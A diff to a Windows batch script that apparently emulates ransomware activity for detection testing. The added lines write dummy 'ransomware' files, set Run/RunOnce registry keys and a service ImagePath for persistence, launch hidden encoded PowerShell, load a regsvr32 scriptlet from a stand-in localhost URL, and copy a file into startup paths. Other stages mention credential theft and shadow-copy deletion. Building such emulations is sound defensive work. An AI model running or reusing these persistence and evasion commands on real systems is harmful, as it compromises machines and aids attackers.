@@ -15,6 +15,12 @@ echo.
 
 mkdir "%TEMP%\encrypt_payload" 2>nul
 
+echo [*] Stage 0: Persistence and high-entropy dropper staging
+"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "$rng = [System.Security.Cryptography.RandomNumberGenerator]::Create(); foreach ($f in @(\"$env:PUBLIC\\ransomware.exe\", \"$env:ProgramData\\ransomware.dll\", \"$env:PUBLIC\\ransomware.scr\", \"$env:TEMP\\encrypt_payload\\stage0.bin\")) { $bytes = [byte[]]::new(32768); $rng.GetBytes($bytes); [System.IO.File]::WriteAllBytes($f, $bytes) }"
+"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'RansomwareVariant' -Value \"$env:PUBLIC\\ransomware.exe\" -PropertyType String -Force; New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce' -Name 'RansomwareVariantOnce' -Value \"$env:ProgramData\\ransomware.dll\" -PropertyType String -Force; New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Services\RansomwareSvc' -Name 'ImagePath' -Value \"$env:PUBLIC\\ransomware.exe\" -PropertyType String -Force"
+start /min powershell.exe -NoProfile -EncodedCommand SQBFAFgA >nul 2>&1
+start /min regsvr32.exe /s /n /u /i:http://127.0.0.1/fake.sct scrobj.dll >nul 2>&1
+
 REM Stage 1: Generate encrypted victim files (high entropy)
 echo [*] Stage 1: Generating encrypted file payloads
 "%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "for ($i=0; $i -lt 40; $i++) { $bytes = [byte[]]::new(8192); [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($bytes); [System.IO.File]::WriteAllBytes(\"$env:TEMP\encrypt_payload\encrypted_$i.dat\", $bytes) }"
@@ -45,6 +51,7 @@ echo [*] Stage 4: Browser credential access
 REM Stage 5: Startup folder persistence
 echo [*] Stage 5: Startup folder persistence
 "%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "copy-item '%TEMP%\encrypt_payload\encrypted_0.dat' 'C:\Users\Public\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.exe' -ErrorAction SilentlyContinue"
+"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "copy-item '%TEMP%\encrypt_payload\encrypted_1.dat' 'C:\Users\Public\startup_ransomware.exe' -ErrorAction SilentlyContinue"
 
 REM Stage 6: VSSAdmin deletion (ransomware classic)
 echo [*] Stage 6: Shadow copy deletion simulation
